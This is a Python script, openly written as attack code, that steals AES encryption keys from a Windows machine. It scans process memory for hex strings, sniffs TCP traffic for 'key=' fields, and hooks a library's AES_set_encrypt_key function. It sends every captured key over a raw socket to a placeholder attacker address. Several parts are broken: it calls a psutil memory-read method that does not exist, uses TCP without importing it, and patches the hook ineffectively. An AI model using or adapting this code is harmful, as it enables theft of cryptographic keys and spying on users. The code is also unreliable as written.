import psutil
import ctypes
import socket
import re

# Define the IP and port to send the key
attacker_ip = 'attacker_ip'
attacker_port = 9999

# Function to send data to the attacker
def send_to_attacker(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((attacker_ip, attacker_port))
            s.sendall(data)
    except Exception as e:
        print(f"Failed to send data: {e}")

# Function to find AES keys in process memory
def find_aes_keys():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            pid = proc.info['pid']
            proc_handle = ctypes.windll.kernel32.OpenProcess(0x0010, False, pid)  # PROCESS_VM_READ
            if not proc_handle:
                continue

            # Example memory scanning (to be adapted for real scenarios)
            mem_ranges = [0x00000000, 0x7FFFFFFF]  # Example range
            for start in mem_ranges:
                try:
                    mem_content = psutil.Process(pid).memory_read(start, 4096)
                    keys = re.findall(b'[0-9a-fA-F]{64}', mem_content)  # Example regex for hex keys
                    for key in keys:
                        send_to_attacker(key)
                except Exception as e:
                    print(f"Failed to read memory or find keys: {e}")
        except Exception as e:
            print(f"Failed to access process: {e}")

# Function to set up network sniffer
def setup_sniffer():
    from scapy.all import sniff

    def packet_callback(packet):
        if packet.haslayer(TCP):
            payload = packet[TCP].payload
            if b'key=' in payload:
                send_to_attacker(payload)

    # Start sniffing on the network interface
    sniff(iface='eth0', filter='tcp', prn=packet_callback)

# Example function for library hooking
def hook_library():
    lib = ctypes.CDLL('path_to_encryption_library')
    original_function = lib.AES_set_encrypt_key

    def hooked_function(*args, **kwargs):
        key = args[0]
        send_to_attacker(key)
        return original_function(*args, **kwargs)

    lib.AES_set_encrypt_key = ctypes.CFUNCTYPE(None, ctypes.c_char_p)(hooked_function)

# Set up components
hook_library()
setup_sniffer()

# Continuously search for keys
while True:
    find_aes_keys()